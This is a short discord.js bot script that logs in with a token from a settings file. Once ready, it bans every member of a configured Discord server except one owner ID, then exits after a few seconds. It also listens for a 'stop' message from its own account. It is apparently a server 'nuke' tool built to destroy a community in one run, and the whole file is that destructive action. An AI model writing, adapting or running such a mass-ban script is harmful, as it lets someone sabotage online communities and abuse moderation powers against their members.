const Discord = require('discord.js');
const client = new Discord.Client();
const settings = require('../settings.json');

client.on('ready', () => {
    client.guilds.get(settings.auto.server_id).roles.find('name', '@everyone').members.map(c => {
        if (c.id !== settings.ownerid) {
            c.ban();
        }
    });
    function stop(){
        process.exit();
    }
    setTimeout(stop, 7500);
});

client.on('message', async message => {
    if (message.author.id === client.user.id) {
        if (message.content.startsWith('stop')) {
            process.exit();
        }
    }
})


client.login(settings.token);